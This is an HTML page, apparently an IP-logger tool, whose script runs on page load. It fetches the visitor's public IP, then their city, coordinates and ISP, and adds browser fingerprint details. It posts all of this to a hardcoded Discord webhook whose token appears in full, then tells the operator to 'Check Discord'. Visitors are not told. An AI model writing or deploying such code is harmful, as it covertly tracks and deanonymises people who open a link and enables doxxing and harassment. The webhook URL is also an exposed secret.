<!DOCTYPE html>
<html>
<head>
    <title>Visitor Info</title>
</head>
<body>
    <h1>Loading your information...</h1>
    
    <script>
        // Your Discord webhook
        const WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
        
        // Browser info (always available)
        const browserData = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform
        };
        
        // Function to send to Discord
        function sendToDiscord(data) {
            let message = '🆕 **New Visitor**\n';
            for (let [key, value] of Object.entries(data)) {
                message += `**${key}:** ${value}\n`;
            }
            
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            }).catch(e => console.log('Discord send failed:', e));
        }
        
        // Step 1: Get IP address (this ALWAYS works)
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                const ip = ipData.ip;
                
                // Step 2: Get location using that IP
                return fetch(`https://ipapi.co/${ip}/json/`)
                    .then(r => r.json())
                    .then(locationData => {
                        // Combine everything
                        const fullData = {
                            'IP Address': ip,
                            'Location': `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
                            'Coordinates': locationData.latitude ? `${locationData.latitude}, ${locationData.longitude}` : '?',
                            'ISP': locationData.org || 'N/A',
                            ...browserData
                        };
                        
                        // Send to Discord
                        sendToDiscord(fullData);
                        
                        // Update page
                        document.body.innerHTML = '<h1>✅ Info captured</h1><p>Check Discord</p>';
                    });
            })
            .catch(err => {
                // If location fails, at least send IP + browser info
                console.log('Location failed, sending basic info');
                sendToDiscord({
                    'IP Address': 'See browser info only',
                    ...browserData,
                    'Note': 'Location unavailable'
                });
                document.body.innerHTML = '<h1>⚠️ Basic info sent</h1>';
            });
    </script>
</body>
</html>
